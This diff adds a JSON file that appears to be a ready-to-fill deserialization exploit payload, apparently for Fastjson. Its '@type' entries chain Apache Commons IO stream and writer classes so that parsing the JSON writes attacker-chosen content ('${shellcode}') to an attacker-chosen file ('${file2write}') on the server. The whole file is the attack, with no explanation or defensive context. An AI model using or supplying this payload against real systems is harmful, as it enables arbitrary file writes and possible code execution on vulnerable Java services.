@@ -1,0 +1,47 @@
+{
+    "a": {
+      "@type": "java.io.InputStream",
+      "@type": "org.apache.commons.io.input.AutoCloseInputStream",
+      "in": {
+        "@type": "org.apache.commons.io.input.TeeInputStream",
+        "input": {
+          "@type": "org.apache.commons.io.input.CharSequenceInputStream",
+          "cs": {
+            "@type": "java.lang.String"
+            "${shellcode}",
+            "charset": "iso-8859-1",
+            "bufferSize": ${size}
+          },
+          "branch": {
+            "@type": "org.apache.commons.io.output.WriterOutputStream",
+            "writer": {
+              "@type": "org.apache.commons.io.output.LockableFileWriter",
+              "file": "${file2write}",
+              "charset": "iso-8859-1",
+              "append": true
+            },
+            "charset": "iso-8859-1",
+            "bufferSize": 1024,
+            "writeImmediately": true
+          },
+          "closeBranch": true
+        }
+      },
+      "b": {
+        "@type": "java.io.InputStream",
+        "@type": "org.apache.commons.io.input.ReaderInputStream",
+        "reader": {
+          "@type": "org.apache.commons.io.input.XmlStreamReader",
+          "inputStream": {
+            "$ref": "$.a"
+          },
+          "httpContentType": "text/xml",
+          "lenient": false,
+          "defaultEncoding": "iso-8859-1"
+        },
+        "charsetName": "iso-8859-1",
+        "bufferSize": 1024
+      },
+      "c": {}
+    }
+  
